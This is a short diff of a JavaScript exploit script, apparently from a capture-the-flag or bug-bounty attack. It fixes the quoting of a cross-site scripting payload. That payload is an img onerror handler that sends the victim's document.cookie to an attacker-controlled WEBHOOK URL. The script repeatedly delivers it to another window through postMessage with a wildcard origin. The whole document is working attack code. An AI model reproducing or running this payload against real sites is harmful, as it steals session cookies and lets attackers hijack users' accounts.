@@ -11,7 +11,7 @@ setTimeout(() => {
 
   
 
-  const payload = <img src=x onerror="location.href='${WEBHOOK}?cookie='+encodeURIComponent(document.cookie)">;
+  const payload = `<img src=x onerror="location.href='${WEBHOOK}?cookie='+encodeURIComponent(document.cookie)">`;
 
   setInterval(() => {
       w.postMessage({ html: payload }, "*");
